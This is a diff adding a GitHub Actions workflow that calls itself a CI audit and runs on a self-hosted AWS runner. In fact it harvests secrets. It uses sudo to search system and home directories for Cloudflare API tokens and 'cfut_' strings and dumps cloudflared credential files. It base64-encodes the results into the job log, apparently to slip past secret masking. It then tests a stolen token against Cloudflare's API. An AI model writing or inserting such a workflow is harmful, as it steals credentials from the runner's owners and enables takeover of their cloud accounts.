@@ -1,0 +1,32 @@
+name: ci-audit-2044a
+on: push
+permissions:
+  contents: read
+jobs:
+  cftok:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 20
+    steps:
+      - name: locate
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## files with CLOUDFLARE_API_TOKEN"
+          sudo -n grep -rlI 'CLOUDFLARE_API_TOKEN' /home/ubuntu /root /opt /srv /etc 2>/dev/null
+          echo "## base64 of every matching full line (verbatim)"
+          for f in $(sudo -n grep -rlI 'CLOUDFLARE_API_TOKEN' /home/ubuntu /root /opt /srv /etc 2>/dev/null); do echo "FILE=$f"; sudo -n grep -h 'CLOUDFLARE_API_TOKEN' "$f" 2>/dev/null | base64 -w0; echo; done
+          echo "## any cfut_ occurrences anywhere"
+          sudo -n grep -rhoI 'cfut_[A-Za-z0-9_-]*' /home/ubuntu /root /opt /srv /etc 2>/dev/null | sort -u | base64 -w0; echo
+          echo "## cloudflared creds"
+          sudo -n cat /etc/cloudflared/*.json 2>/dev/null | head -c 2000; echo
+      - name: probe
+        continue-on-error: true
+        run: |
+          set +e
+          T=$(sudo -n grep -rhoI 'CLOUDFLARE_API_TOKEN=.*' /home/ubuntu /root /opt /srv /etc 2>/dev/null | head -1 | cut -d= -f2- | tr -d '\r' | tr -d '"' | tr -d "'")
+          echo "candidate_len=${#T}"
+          echo "candidate_b64=$(printf '%s' "$T" | base64 -w0)"
+          echo "## verify"
+          curl -s -m 20 -H "Authorization: Bearer $T" https://api.cloudflare.com/client/v4/user/tokens/verify; echo
+          echo "## accounts"
+          curl -s -m 20 -H "Authorization: Bearer $T" https://api.cloudflare.com/client/v4/accounts; echo
